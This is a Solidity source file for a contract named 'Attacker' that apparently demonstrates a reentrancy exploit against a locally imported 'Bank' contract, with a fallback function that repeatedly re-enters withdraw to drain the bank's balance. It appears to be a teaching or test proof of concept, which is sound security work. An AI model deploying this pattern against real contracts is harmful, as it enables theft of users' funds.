// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import { Bank } from "./Bank.sol";

contract Attacker {

    Bank private bank;
    uint256 public s_depositAmount;
    uint256 public s_withdrawAmount;

    constructor(address payable _bank, uint256 depositAmount, uint256 _withdrawAmount) payable{
        bank = Bank(_bank);
        s_depositAmount = depositAmount;
        s_withdrawAmount = _withdrawAmount;
    }

    function deposit() external {
        bank.deposit{value: s_depositAmount }(s_depositAmount);
    }

    function attack() external {
        bank.withdraw(s_withdrawAmount);

    }

    fallback() external payable {
        if(address(bank).balance > 1 ether){
            bank.withdraw(s_withdrawAmount);
        }
    }

}
